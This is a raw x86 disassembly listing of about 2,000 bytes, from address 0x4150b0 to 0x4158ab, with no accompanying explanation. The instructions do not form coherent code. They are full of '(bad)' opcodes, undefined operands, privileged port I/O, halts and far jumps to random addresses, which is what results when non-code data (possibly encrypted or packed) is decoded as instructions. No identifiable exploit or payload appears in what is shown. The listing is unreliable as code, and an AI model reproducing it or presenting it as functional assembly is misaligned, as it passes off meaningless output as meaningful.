  4150b0:	push   edx
  4150b1:	and    al,0xd8
  4150b3:	xor    edx,DWORD PTR [ebx]
  4150b5:	mov    WORD PTR [eax+0xdff624c],ss
  4150bb:	mov    edx,DWORD PTR [edx+0x65e58eae]
  4150c1:	xor    al,0x63
  4150c3:	sbb    ebx,ebx
  4150c5:	pop    edx
  4150c6:	xlat   BYTE PTR ds:[ebx]
  4150c7:	push   ecx
  4150c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150c9:	fstp   QWORD PTR [eax]
  4150cb:	fldl2t 
  4150cd:	dec    esp
  4150ce:	or     al,0x4f
  4150d0:	mov    DWORD PTR [eax],ecx
  4150d2:	jae    0x4150f4
  4150d4:	inc    esi
  4150d5:	push   edi
  4150d6:	sub    ebx,DWORD PTR ds:0x811df4c3
  4150dc:	sub    eax,0xb9201dba
  4150e1:	das    
  4150e2:	and    eax,0xcb259f3d
  4150e7:	pop    esp
  4150e8:	mov    eax,ds:0xd4a05ec6
  4150ed:	pop    ds
  4150ee:	(bad)  
  4150ef:	dec    ebx
  4150f0:	cmp    al,0x36
  4150f2:	(bad)  
  4150f3:	repnz and eax,0xae0d92e0
  4150f9:	pop    esp
  4150fa:	aas    
  4150fb:	mov    ebx,0x94aa93ea
  415100:	loop   0x415157
  415102:	or     dh,ch
  415104:	neg    BYTE PTR [esi]
  415106:	test   DWORD PTR [esi-0x3bc05cb7],0x28705c9
  415110:	cmp    al,BYTE PTR [eax]
  415112:	ret    
  415113:	(bad)  
  415114:	(bad)  
  415115:	sahf   
  415116:	retf   0xb43c
  415119:	mov    DWORD PTR [eax-0x54d2392e],esi
  41511f:	inc    BYTE PTR [esp+edi*2]
  415122:	cwde   
  415123:	pop    esi
  415124:	xchg   esp,eax
  415125:	mov    edi,0xd1f2851f
  41512a:	cmc    
  41512b:	fisubr WORD PTR [ebp-0x6b4b58a]
  415131:	xchg   ecx,eax
  415132:	mov    ?,edx
  415134:	fadd   QWORD PTR [ebx-0x5f5852e0]
  41513a:	icebp  
  41513b:	push   esp
  41513c:	mov    eax,0x9643ca24
  415141:	mov    eax,0x3c64e9ec
  415146:	loop   0x4150fc
  415148:	xor    DWORD PTR [ebp-0x44],ebx
  41514b:	in     eax,0xb7
  41514d:	jmp    0x415154
  41514f:	mul    BYTE PTR [ebp+esi*2-0x6e64d893]
  415156:	xchg   ebx,eax
  415157:	ficomp DWORD PTR [ecx+0x10]
  41515a:	mov    edx,esp
  41515c:	inc    ecx
  41515d:	test   edi,0x995fb7c7
  415163:	leave  
  415164:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415165:	nop
  415166:	sub    edi,esp
  415168:	mov    eax,ds:0x47259249
  41516d:	clc    
  41516e:	popa   
  41516f:	stos   DWORD PTR es:[edi],eax
  415170:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415171:	fnstsw WORD PTR [esi]
  415173:	pop    eax
  415174:	lods   eax,DWORD PTR ds:[esi]
  415175:	fwait
  415176:	iret   
  415177:	mov    ds,ecx
  415179:	jmp    0x4151e4
  41517b:	pop    es
  41517c:	pusha  
  41517d:	(bad)  [ebp+0xb7b4c66]
  415183:	adc    bl,ah
  415185:	mov    ah,0x78
  415187:	xor    bl,BYTE PTR [ecx]
  415189:	hlt    
  41518a:	push   esi
  41518b:	sbb    al,0xd0
  41518d:	jmp    0x4151d4
  41518f:	jle    0x4151d8
  415191:	jmp    0x76a6:0xf7ac21c0
  415198:	jb     0x41514a
  41519a:	in     al,0x73
  41519c:	scas   al,BYTE PTR es:[edi]
  41519d:	ins    DWORD PTR es:[edi],dx
  41519e:	mov    esp,0x51ef66e0
  4151a3:	not    BYTE PTR [esi]
  4151a5:	mov    eax,ds:0xe3aa5959
  4151aa:	rcl    bl,0xf1
  4151ad:	dec    ecx
  4151ae:	mov    edx,0xf7164243
  4151b3:	jb     0x41520d
  4151b5:	xchg   esp,eax
  4151b6:	aam    0xf4
  4151b8:	in     al,0x6e
  4151ba:	retf   
  4151bb:	mov    esp,0xed68f00e
  4151c0:	dec    edx
  4151c1:	xor    ebx,DWORD PTR [edx-0x547e2e9d]
  4151c7:	mov    dl,BYTE PTR [eax]
  4151c9:	(bad)  
  4151ca:	dec    edi
  4151cb:	mov    dh,0x5c
  4151cd:	xor    eax,0xabbf7e31
  4151d2:	mov    bl,0x35
  4151d4:	mov    ebp,0xbe42b6bd
  4151d9:	push   ebx
  4151da:	jo     0x415254
  4151dc:	(bad)  
  4151dd:	jl     0x415212
  4151df:	dec    edi
  4151e0:	loopne 0x4151ab
  4151e2:	pop    ss
  4151e3:	sbb    eax,0x9806be77
  4151e8:	sub    al,0x61
  4151ea:	cwde   
  4151eb:	retf   0xd541
  4151ee:	and    al,0x4f
  4151f0:	mov    dh,0xdb
  4151f2:	in     eax,dx
  4151f3:	cmp    dl,BYTE PTR [ecx-0x63]
  4151f6:	ins    DWORD PTR es:[edi],dx
  4151f7:	clc    
  4151f8:	xchg   ecx,eax
  4151f9:	xor    BYTE PTR [eax-0xff2a779],al
  4151ff:	lea    eax,[ebx+0x16b4beb5]
  415205:	adc    DWORD PTR [ebp+0x3f],0xffffffc6
  415209:	mov    ch,ah
  41520b:	pop    ebx
  41520c:	mov    BYTE PTR [edx],ch
  41520e:	fmul   st,st(0)
  415210:	inc    BYTE PTR [esi]
  415212:	ja     0x415275
  415214:	mov    ebx,DWORD PTR [edi+0x5c]
  415217:	push   edi
  415218:	sar    dh,cl
  41521a:	xor    eax,DWORD PTR [edx+0x1664bbb5]
  415220:	addr16 mov dl,0x29
  415223:	cmp    DWORD PTR [eax],esp
  415225:	cmp    BYTE PTR [edx-0x40565649],bl
  41522b:	adc    DWORD PTR [ebx-0x58],edx
  41522e:	clc    
  41522f:	mov    dl,0x86
  415231:	scas   eax,DWORD PTR es:[edi]
  415232:	cmove  edi,DWORD PTR [edi-0x13]
  415236:	aas    
  415237:	xchg   esi,eax
  415238:	out    dx,al
  415239:	sti    
  41523a:	cmp    DWORD PTR [edx-0x4],edi
  41523d:	push   0x3086bb41
  415242:	xchg   ecx,eax
  415243:	sbb    ch,BYTE PTR [eax]
  415245:	rol    DWORD PTR [ebp+0x76bee3e4],cl
  41524b:	cmc    
  41524c:	aad    0xed
  41524e:	scas   al,BYTE PTR es:[edi]
  41524f:	adc    ah,ch
  415251:	jo     0x41524d
  415253:	and    ebx,DWORD PTR [edi+eax*4+0x7cf2c3b9]
  41525a:	in     al,dx
  41525b:	gs int3 
  41525d:	xchg   edi,eax
  41525e:	loopne 0x4151f6
  415260:	fsubr  DWORD PTR [esi]
  415262:	call   0x8a2d:0x7d2548e8
  415269:	aaa    
  41526a:	inc    edi
  41526b:	and    eax,0xd836222e
  415270:	popa   
  415271:	call   0xca1e9f3a
  415276:	sub    eax,0x50e44f72
  41527b:	mov    edx,0x7d2a2b41
  415280:	shl    BYTE PTR [esi+0x8],0x53
  415284:	mov    al,ds:0xea8a966c
  415289:	aam    0xd3
  41528b:	add    ah,BYTE PTR [edi]
  41528d:	push   esi
  41528e:	cmp    ah,bl
  415290:	sub    eax,0xe16674a4
  415295:	sub    esp,DWORD PTR [edi-0x2b]
  415298:	(bad)  [esi-0xd]
  41529b:	sub    eax,esi
  41529d:	mov    bl,0xbb
  41529f:	push   ebx
  4152a0:	sub    BYTE PTR [esi+edi*4],bl
  4152a3:	adc    DWORD PTR [ecx-0x4],ecx
  4152a6:	lahf   
  4152a7:	cmp    dh,BYTE PTR [ebx-0x23]
  4152aa:	pop    ss
  4152ab:	xchg   esp,eax
  4152ac:	mov    edx,0x8a8f284b
  4152b1:	out    dx,eax
  4152b2:	or     al,0x1a
  4152b4:	dec    ecx
  4152b5:	fiadd  WORD PTR [eax]
  4152b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152b8:	xchg   ecx,eax
  4152b9:	xchg   ebx,eax
  4152ba:	add    esp,esp
  4152bc:	outs   dx,BYTE PTR ds:[esi]
  4152bd:	out    dx,eax
  4152be:	js     0x4152cf
  4152c0:	adc    eax,0x7381cad0
  4152c5:	xchg   DWORD PTR [eax],ebx
  4152c7:	inc    edi
  4152c8:	xchg   esp,eax
  4152c9:	mov    DWORD PTR [ecx+0x687c63e2],edi
  4152cf:	shl    BYTE PTR [esi],1
  4152d1:	outs   dx,BYTE PTR ds:[esi]
  4152d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152d3:	xor    bh,bh
  4152d5:	dec    esp
  4152d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152d7:	(bad)  
  4152d8:	ret    
  4152d9:	pop    eax
  4152da:	lds    edi,FWORD PTR [ebx+edi*2+0x6610facf]
  4152e1:	mov    ebx,edi
  4152e3:	xchg   esi,eax
  4152e4:	mov    bh,0xe5
  4152e6:	push   eax
  4152e7:	sbb    DWORD PTR [esi-0x11],0x50619ca8
  4152ee:	mov    DWORD PTR [esp+ebx*1+0x63151b8],0x8919fab9
  4152f9:	xchg   ecx,eax
  4152fa:	push   edx
  4152fb:	(bad)  
  4152fc:	cs mov cl,0x13
  4152ff:	dec    edi
  415300:	ret    0x46f
  415303:	xchg   ebx,esi
  415305:	mov    dh,0xe7
  415307:	sub    edi,ebx
  415309:	mov    cl,0x4d
  41530b:	sbb    al,0x5d
  41530d:	call   0x8908b3b6
  415312:	inc    edi
  415313:	loopne 0x415334
  415315:	jns    0x4152ca
  415317:	outs   dx,DWORD PTR ds:[esi]
  415318:	test   al,0xfa
  41531a:	adc    al,0x97
  41531c:	sub    cl,BYTE PTR [edi+0x40ed7fa4]
  415322:	pop    ecx
  415323:	imul   ebx,DWORD PTR [ebp+0x69],0xffffff93
  415327:	add    eax,DWORD PTR [esp+ebx*1-0x4d]
  41532b:	cmp    dh,bl
  41532d:	mov    edx,0x2f0d70fd
  415332:	jbe    0x41537a
  415334:	call   0xa43b9116
  415339:	push   eax
  41533a:	pop    ecx
  41533b:	sub    eax,0xbe38b2d9
  415340:	loop   0x41533d
  415342:	test   al,0x6c
  415344:	imul   DWORD PTR [esi+0x1a]
  415347:	call   0x350abcbc
  41534c:	push   cs
  41534d:	sbb    DWORD PTR [edi],ebx
  41534f:	adc    eax,esi
  415351:	add    cl,0xe4
  415354:	sahf   
  415355:	inc    ebx
  415356:	loopne 0x415348
  415358:	mov    al,cs:0x8f1d7996
  41535e:	adc    eax,DWORD PTR [edi+0x4f64de72]
  415364:	shl    BYTE PTR [esi+0x42],1
  415367:	ins    DWORD PTR es:[edi],dx
  415368:	mov    edx,DWORD PTR ds:0x5caa0acc
  41536e:	repz mov edi,edx
  415371:	scas   eax,DWORD PTR es:[edi]
  415372:	inc    ebp
  415373:	push   edi
  415374:	ret    0xee77
  415377:	test   al,0xd9
  415379:	sub    bh,dl
  41537b:	mov    dh,0xda
  41537d:	jae    0x415367
  41537f:	iret   
  415380:	sbb    al,0x86
  415382:	dec    edx
  415383:	iret   
  415384:	rcl    BYTE PTR [ebp+0x64],1
  415387:	sub    cl,BYTE PTR [eax-0x75]
  41538a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41538b:	inc    eax
  41538c:	jb     0x4153ba
  41538e:	in     eax,0x93
  415390:	mov    al,ds:0x6fb08197
  415395:	sbb    eax,0xac197628
  41539a:	sub    esp,eax
  41539c:	loope  0x4153ad
  41539e:	sar    DWORD PTR ds:0x63ce2686,cl
  4153a4:	push   ebx
  4153a5:	mov    esi,0xb58078d3
  4153aa:	cdq    
  4153ab:	xor    al,BYTE PTR [edi-0x14]
  4153ae:	in     eax,dx
  4153af:	jo     0x4153cf
  4153b1:	xchg   ebx,eax
  4153b2:	shl    DWORD PTR [edx-0x3f],cl
  4153b5:	jbe    0x41536b
  4153b7:	es int 0xc4
  4153ba:	pop    esp
  4153bb:	fdiv   st(4),st
  4153bd:	aas    
  4153be:	into   
  4153bf:	das    
  4153c0:	jmp    0xb4cb5a3a
  4153c5:	add    ch,BYTE PTR [ebx]
  4153c7:	mov    ds:0x567341d,al
  4153cc:	dec    edx
  4153cd:	dec    DWORD PTR ds:0x4a0c69e8
  4153d3:	push   esi
  4153d4:	jnp    0x415362
  4153d6:	mov    al,0xd3
  4153d8:	jno    0x415413
  4153da:	xor    al,0xea
  4153dc:	loope  0x415399
  4153de:	xor    ah,dl
  4153e0:	iret   
  4153e1:	push   esi
  4153e2:	or     bh,BYTE PTR [eax]
  4153e4:	(bad)  [bx+0x4b77]
  4153ea:	sub    edi,DWORD PTR [edi-0x1030384d]
  4153f0:	icebp  
  4153f1:	sub    ebp,ecx
  4153f3:	into   
  4153f4:	int3   
  4153f5:	sub    al,0xc5
  4153f7:	inc    esi
  4153f8:	in     al,dx
  4153f9:	pop    ds
  4153fa:	jecxz  0x415423
  4153fc:	fwait
  4153fd:	xchg   DWORD PTR [ebx+ecx*8+0x3778ce06],ebp
  415404:	stos   BYTE PTR es:[edi],al
  415405:	mov    ebp,0x1c1b905c
  41540a:	aad    0x31
  41540c:	das    
  41540d:	jae    0x41546e
  41540f:	sub    edi,eax
  415411:	frstor [ebx+0x40]
  415414:	punpckhdq mm2,mm2
  415417:	push   edi
  415418:	and    BYTE PTR [edi+ecx*4+0x112cc241],0x21
  415420:	pop    ds
  415421:	cmp    edx,DWORD PTR [edx]
  415423:	loope  0x4153fc
  415425:	fwait
  415426:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415427:	out    0x48,al
  415429:	xlat   BYTE PTR ds:[ebx]
  41542a:	inc    eax
  41542b:	cwde   
  41542c:	sbb    dl,BYTE PTR [ecx+0x1d076b8d]
  415432:	add    eax,0xdb021051
  415437:	fidivr WORD PTR [ebp-0xa]
  41543a:	(bad)  
  41543b:	push   esi
  41543c:	push   edx
  41543d:	test   BYTE PTR [edi+0x46],bl
  415440:	shr    BYTE PTR [ebx+0x36eb3dbc],0x0
  415447:	popa   
  415448:	mov    edx,0x4d2d1ef2
  41544d:	xor    ah,ch
  41544f:	(bad)  
  415450:	hlt    
  415451:	nop
  415452:	loope  0x4154a9
  415454:	aam    0xee
  415456:	inc    esi
  415457:	fxch   st(6)
  415459:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41545a:	xor    DWORD PTR [ecx+0x3a0dd8a],ebx
  415460:	repz pop ds
  415462:	nop
  415463:	outs   dx,BYTE PTR ds:[esi]
  415464:	sahf   
  415465:	pop    DWORD PTR ds:0xd79f8672
  41546b:	jo     0x41543e
  41546d:	adc    DWORD PTR [ecx+0x56eed628],ebp
  415473:	pop    ss
  415474:	xchg   DWORD PTR [esi],esi
  415476:	stos   DWORD PTR es:[edi],eax
  415477:	cmp    eax,0x134cda4
  41547c:	jno    0x4154dd
  41547e:	push   ebp
  41547f:	mov    al,0x55
  415481:	xor    eax,0x8b088d95
  415486:	mov    bl,0xad
  415488:	adc    DWORD PTR [ecx-0x4e],edx
  41548b:	fstp   QWORD PTR [edi-0x123945cf]
  415491:	push   ds
  415492:	inc    ecx
  415493:	mov    bl,0x54
  415495:	outs   dx,DWORD PTR ds:[esi]
  415496:	(bad)  
  415497:	pop    esp
  415498:	or     eax,ecx
  41549a:	sub    eax,DWORD PTR [eax-0x1d351c68]
  4154a0:	push   0xdb57dfe6
  4154a5:	sbb    DWORD PTR [eax+esi*4],edx
  4154a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154a9:	and    edx,DWORD PTR [ecx+0x42f3af49]
  4154af:	sub    eax,0x1153d93
  4154b4:	call   0x812a4981
  4154b9:	sbb    BYTE PTR [edx],cl
  4154bb:	dec    esi
  4154bc:	mov    ch,0x34
  4154be:	leave  
  4154bf:	adc    ebp,DWORD PTR [edi]
  4154c1:	and    eax,DWORD PTR [edi+edi*8]
  4154c4:	inc    ebx
  4154c5:	mov    ebp,0x34bc9737
  4154ca:	and    al,0x35
  4154cc:	leave  
  4154cd:	adc    BYTE PTR [edx-0x44],cl
  4154d0:	sub    dh,dl
  4154d2:	push   0x5768dd1e
  4154d7:	fdiv   QWORD PTR [esi]
  4154d9:	jae    0x4154b9
  4154db:	sbb    ch,BYTE PTR [ecx]
  4154dd:	inc    esp
  4154de:	mov    DWORD PTR [esi+0x67c5f8cf],0x673ee9e2
  4154e8:	addr16 inc edx
  4154ea:	inc    edx
  4154eb:	mov    ds:0x82e40d9a,al
  4154f0:	loope  0x4154ae
  4154f2:	xchg   ebx,eax
  4154f3:	ins    BYTE PTR es:[edi],dx
  4154f4:	cmp    eax,0xe153dc81
  4154f9:	pop    esp
  4154fa:	dec    edi
  4154fb:	add    cl,BYTE PTR [ebp+0x73038e2b]
  415501:	mov    BYTE PTR [eax],bh
  415503:	mov    ds:0x88307fef,al
  415508:	add    dh,BYTE PTR [ecx-0x7dbe3b7d]
  41550e:	nop
  41550f:	retf   0xfd78
  415512:	fucom  st(7)
  415514:	xchg   esp,eax
  415515:	outs   dx,BYTE PTR ds:[esi]
  415516:	and    edi,DWORD PTR [edi+0x5d229380]
  41551c:	into   
  41551d:	or     eax,0x2dcf34f7
  415522:	push   es
  415523:	pop    esp
  415524:	jae    0x415582
  415526:	mov    ds:0xc4a17e06,eax
  41552b:	gs inc ecx
  41552d:	jge    0x415566
  41552f:	mov    eax,0x29885c1a
  415534:	sahf   
  415535:	addr16 jnp 0x415589
  415538:	and    esi,esp
  41553a:	dec    esp
  41553b:	inc    si
  41553d:	and    al,0xf9
  41553f:	cdq    
  415540:	cmp    BYTE PTR [edx+eax*8],0xe7
  415544:	je     0x415565
  415546:	ror    BYTE PTR [edi+0x21a1029],cl
  41554c:	in     eax,dx
  41554d:	in     eax,dx
  41554e:	pop    es
  41554f:	(bad)  
  415550:	sbb    ebp,DWORD PTR ds:0xc45cef00
  415556:	dec    esi
  415557:	aam    0xbf
  415559:	(bad)  
  41555a:	push   edx
  41555b:	jecxz  0x4154fe
  41555d:	scas   al,BYTE PTR es:[edi]
  41555e:	pop    ecx
  41555f:	out    dx,eax
  415560:	loopne 0x415509
  415562:	xor    esp,eax
  415564:	push   0x6cb0a04c
  415569:	jbe    0x4155b0
  41556b:	xchg   ah,al
  41556d:	adc    al,0x59
  41556f:	mulps  xmm6,xmm3
  415572:	jae    0x415569
  415574:	mov    edx,0xe9aef8a5
  415579:	loop   0x4155e5
  41557b:	mov    eax,ds:0xacc8dbb2
  415580:	fild   WORD PTR [ebp+0x36]
  415583:	shl    DWORD PTR [ebx],cl
  415585:	sub    BYTE PTR ds:0x85c3195a,ah
  41558b:	inc    ebp
  41558c:	fstp   QWORD PTR [ebp+0x5a]
  41558f:	jae    0x4155b8
  415591:	fwait
  415592:	jle    0x415588
  415594:	cli    
  415595:	mov    WORD PTR [edx+0x68],?
  415598:	lock sbb eax,0xbdcede5f
  41559e:	shl    DWORD PTR [esi],1
  4155a0:	and    esp,eax
  4155a2:	jmp    0xd2d1dabc
  4155a7:	and    BYTE PTR ds:0x50c9218c,0x74
  4155ae:	add    dh,BYTE PTR [ebx+0x30]
  4155b1:	aaa    
  4155b2:	icebp  
  4155b3:	cdq    
  4155b4:	inc    eax
  4155b5:	mov    al,0xf7
  4155b7:	imul   edi,DWORD PTR [ecx+0x6e],0xb1915f41
  4155be:	and    ecx,DWORD PTR [ecx-0x56f0cf35]
  4155c4:	inc    esp
  4155c5:	sahf   
  4155c6:	sub    DWORD PTR [ecx+0x4f],esp
  4155c9:	sub    esi,DWORD PTR [edx]
  4155cb:	jno    0x415558
  4155cd:	rcr    BYTE PTR [edx+0x4ff440ce],0xb0
  4155d4:	inc    esi
  4155d5:	js     0x4155a9
  4155d7:	(bad)  
  4155d8:	aam    0xed
  4155da:	dec    eax
  4155db:	mov    cl,0xb5
  4155dd:	fidivr WORD PTR [edx-0x7b89a1a5]
  4155e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155e4:	loope  0x41558d
  4155e6:	rcl    BYTE PTR [edx+0x58ecf7bd],0xdb
  4155ed:	push   esp
  4155ee:	repnz movs DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4155f1:	sub    DWORD PTR [ebp-0x3ff7ef06],edi
  4155f7:	pop    ecx
  4155f8:	mov    esp,0x55c28a75
  4155fd:	rcl    BYTE PTR [edx-0x3e],0x9f
  415601:	xor    eax,0x7321f093
  415606:	sbb    ebp,DWORD PTR ds:0x99e3fde1
  41560c:	nop
  41560d:	fidivr DWORD PTR [ebp+0x12]
  415610:	xor    eax,0x18bfadad
  415615:	jle    0x4155c5
  415617:	cmp    eax,0x8eab6e2a
  41561c:	test   eax,0x792ed6f0
  415621:	mov    ds:0x8a017bb0,al
  415626:	mov    al,0xee
  415628:	mov    eax,ds:0xf706a137
  41562d:	sbb    DWORD PTR [ebp+eax*8+0x4f4ab317],ebp
  415634:	ret    0xb07c
  415637:	sbb    eax,0xe8e56d8c
  41563c:	and    BYTE PTR [esi],al
  41563e:	(bad)  
  41563f:	fcmovu st,st(0)
  415641:	and    eax,0xfc3f880d
  415646:	call   0xdb53b451
  41564b:	in     eax,0xe8
  41564d:	(bad)  
  41564e:	data16 mov WORD PTR [edi+edx*4+0x67],cs
  415653:	in     eax,0x20
  415655:	xchg   BYTE PTR [ecx+0x2f37c741],ah
  41565b:	cli    
  41565c:	mov    eax,ds:0x7b4df36f
  415661:	push   ecx
  415662:	mov    esp,0x65ba06e
  415667:	mov    ebp,ecx
  415669:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41566a:	xchg   ebp,eax
  41566b:	(bad)  
  41566c:	repnz dec edx
  41566e:	(bad)  
  41566f:	out    0x2b,al
  415671:	ret    
  415672:	inc    esp
  415673:	xchg   ebx,eax
  415674:	int    0x30
  415676:	stos   BYTE PTR es:[edi],al
  415677:	add    ch,BYTE PTR [ecx+eiz*1-0x7]
  41567b:	push   esi
  41567c:	xchg   edi,eax
  41567d:	sar    BYTE PTR [edi+0x6b5d35d8],cl
  415683:	xor    BYTE PTR [esi-0xd],ah
  415686:	xchg   esp,eax
  415687:	push   ebx
  415688:	xor    eax,esi
  41568a:	lea    esp,[edx+0x64536a15]
  415690:	call   0xf228:0x2831349c
  415697:	push   edi
  415698:	loope  0x415626
  41569a:	jno    0x4156f6
  41569c:	mov    ch,0xc5
  41569e:	fidiv  DWORD PTR [ebp+edi*8-0x7b]
  4156a2:	outs   dx,DWORD PTR ds:[esi]
  4156a3:	push   edx
  4156a4:	rcr    eax,cl
  4156a6:	mov    ds:0x675726af,eax
  4156ab:	sbb    esp,DWORD PTR [ebx+0x58342aea]
  4156b1:	aad    0xfe
  4156b3:	repnz mov BYTE PTR [ebp-0x47],al
  4156b7:	adc    ebp,DWORD PTR [edi-0x44d7ac03]
  4156bd:	jmp    0x9c46:0xd1ab4256
  4156c4:	xor    dl,BYTE PTR [ebx+0x6da2c777]
  4156ca:	add    eax,0xb56f34b8
  4156cf:	call   0xfcbfeb40
  4156d4:	stos   BYTE PTR es:[edi],al
  4156d5:	sbb    edi,DWORD PTR [eax+0xc]
  4156d8:	popa   
  4156d9:	mov    ebp,0x50c3e354
  4156de:	(bad)  
  4156df:	lods   eax,DWORD PTR ds:[esi]
  4156e0:	dec    esi
  4156e1:	jns    0x41570d
  4156e3:	jb     0x41571f
  4156e5:	mov    BYTE PTR [ebp+edi*2-0x5e72492e],bh
  4156ec:	push   esi
  4156ed:	inc    ebx
  4156ee:	or     BYTE PTR [ebx-0x6abd0e24],0xf1
  4156f5:	ds xchg edi,eax
  4156f7:	outs   dx,BYTE PTR ds:[esi]
  4156f8:	in     eax,dx
  4156f9:	pop    ebp
  4156fa:	inc    ebx
  4156fb:	xlat   BYTE PTR ds:[ebx]
  4156fc:	sar    BYTE PTR [esi+0x93d362],1
  415702:	cdq    
  415703:	jb     0x41574a
  415705:	stc    
  415706:	cmc    
  415707:	imul   esi,DWORD PTR [ecx+0x6ecee88c],0xb8389667
  415711:	xor    edx,DWORD PTR [eax+esi*1+0x28]
  415715:	and    ecx,0xffffffbf
  415718:	call   0xcc31:0x110dbbe1
  41571f:	push   ss
  415720:	push   esp
  415721:	ror    DWORD PTR [ecx],cl
  415723:	fwait
  415724:	sbb    edx,edi
  415726:	(bad)  
  415727:	rol    BYTE PTR [edx-0x43],1
  41572a:	inc    esp
  41572b:	(bad)  
  41572c:	mov    DWORD PTR [ebp-0x53767f5e],0xe37e1659
  415736:	ss ins DWORD PTR es:[edi],dx
  415738:	xlat   BYTE PTR ds:[ebx]
  415739:	outs   dx,BYTE PTR ds:[si]
  41573b:	lods   eax,DWORD PTR ds:[esi]
  41573c:	or     ecx,eax
  41573e:	sar    BYTE PTR [edi],1
  415740:	jg     0x41576c
  415742:	stc    
  415743:	pop    ecx
  415744:	hlt    
  415745:	pop    ebx
  415746:	daa    
  415747:	mov    bl,0xa0
  415749:	pop    es
  41574a:	push   0x2a
  41574c:	sbb    eax,0x2eaa6850
  415751:	sub    bh,BYTE PTR [ebx+0xd]
  415754:	xchg   ecx,eax
  415755:	mov    BYTE PTR [esi+ecx*1],0x69
  415759:	int3   
  41575a:	mov    ah,ch
  41575c:	or     ecx,ebx
  41575e:	fidiv  DWORD PTR [edx-0xf0f0b71]
  415764:	shl    BYTE PTR [ebx-0x6a63c990],1
  41576a:	mov    ebx,0xd130970e
  41576f:	(bad)  
  415770:	ror    DWORD PTR [edi],1
  415772:	push   ecx
  415773:	out    0x78,al
  415775:	xor    BYTE PTR [esp+eiz*4-0x3],dl
  415779:	fild   DWORD PTR [edx-0x4]
  41577c:	or     BYTE PTR [ecx-0x4dd9159f],bl
  415782:	(bad)  
  415783:	jb     0x415748
  415785:	mov    eax,0xec58587e
  41578a:	inc    BYTE PTR [edi]
  41578c:	adc    ah,BYTE PTR [esi-0x26]
  41578f:	fsubr  QWORD PTR [edi]
  415791:	pop    esp
  415792:	mov    WORD PTR [ecx+edx*2+0x26b05718],gs
  415799:	mov    ds:0x33bed070,al
  41579e:	adc    al,0x2d
  4157a0:	mov    ds:0x65255f41,al
  4157a5:	mov    WORD PTR [ecx-0x3c6252f6],?
  4157ab:	or     al,0xa9
  4157ad:	inc    esp
  4157ae:	pop    ds
  4157af:	je     0x415819
  4157b1:	jp     0x4157a5
  4157b3:	cld    
  4157b4:	jle    0x4157e1
  4157b6:	pop    edi
  4157b7:	repz gs fwait
  4157ba:	addr16 in eax,0x6e
  4157bd:	mov    ah,BYTE PTR [edi+0x49]
  4157c0:	push   ebp
  4157c1:	and    al,0xc2
  4157c3:	hlt    
  4157c4:	ss cdq 
  4157c6:	int3   
  4157c7:	jl     0x415816
  4157c9:	dec    DWORD PTR [ebp+0x13b61405]
  4157cf:	sar    eax,1
  4157d1:	inc    eax
  4157d2:	xchg   ebx,eax
  4157d3:	xchg   edx,eax
  4157d4:	repz push edx
  4157d6:	ficomp WORD PTR [eax+0x6c]
  4157d9:	mov    bl,0xcd
  4157db:	mov    al,0xf4
  4157dd:	sbb    DWORD PTR [eax],edx
  4157df:	xor    BYTE PTR [edi-0x36],ch
  4157e2:	jns    0x415860
  4157e4:	cld    
  4157e5:	mov    al,0x25
  4157e7:	and    ebx,ecx
  4157e9:	and    al,0x81
  4157eb:	inc    eax
  4157ec:	and    ch,BYTE PTR [eax-0x2ff7ec2c]
  4157f2:	add    al,0x65
  4157f4:	std    
  4157f5:	scas   al,BYTE PTR es:[edi]
  4157f6:	call   0xd66a:0xff9e39aa
  4157fd:	aam    0x3e
  4157ff:	into   
  415800:	mov    esi,DWORD PTR [ebp-0x1bfad94e]
  415806:	sub    eax,0x9c8c2d9f
  41580b:	popf   
  41580c:	inc    esi
  41580d:	inc    ecx
  41580e:	mov    al,0xd6
  415810:	mov    BYTE PTR [ecx],dh
  415812:	mov    esp,ebx
  415814:	sbb    dl,BYTE PTR [esi-0x1f]
  415817:	pop    ecx
  415818:	add    eax,0x5f1776e2
  41581d:	cli    
  41581e:	jl     0x4157d6
  415820:	xchg   BYTE PTR ss:[ebx-0x39],cl
  415824:	push   esp
  415825:	xchg   ebx,eax
  415826:	scas   eax,DWORD PTR es:[edi]
  415827:	adc    eax,0x44719266
  41582c:	in     al,dx
  41582d:	pop    ebp
  41582e:	jae    0x4157ff
  415830:	dec    eax
  415831:	ins    BYTE PTR es:[edi],dx
  415832:	sbb    edx,ebx
  415834:	or     BYTE PTR [ebp-0x27b591bf],ah
  41583a:	xchg   DWORD PTR [ebx+0x3f92cb6b],ecx
  415840:	mov    BYTE PTR [ebx+0x7d],cl
  415843:	pop    ebx
  415844:	jl     0x415864
  415846:	jb     0x41581c
  415848:	mov    dl,0xea
  41584a:	jle    0x4158a3
  41584c:	sub    bh,BYTE PTR [ecx]
  41584e:	call   0xe3ba:0x99fa94b6
  415855:	push   edi
  415856:	in     al,0x90
  415858:	ret    
  415859:	aam    0xce
  41585b:	ds in  eax,0x21
  41585e:	mov    ebx,0x6c33d1bb
  415863:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415864:	mov    ds:0x4932584,al
  415869:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41586a:	enter  0x8251,0x98
  41586e:	fnstenv [ebp-0x30]
  415871:	ss add edi,0x36cc450d
  415878:	add    eax,DWORD PTR [ebx-0x3e42ee5d]
  41587e:	shl    BYTE PTR ds:0x24edc220,cl
  415884:	sbb    DWORD PTR [eax+0x2],0xffffff8a
  415888:	dec    ebx
  415889:	mov    esp,0xc50694b1
  41588e:	out    0x48,al
  415890:	mov    edx,0x6da75f48
  415895:	mov    eax,0x790abf38
  41589a:	lock ins BYTE PTR es:[edi],dx
  41589c:	mov    ds:0xddbbf30b,al
  4158a1:	adc    al,0x66
  4158a3:	and    DWORD PTR [esi+0x34],0xd05f8782
  4158aa:	retf   
  4158ab:	jmp    0xa7ad1de2
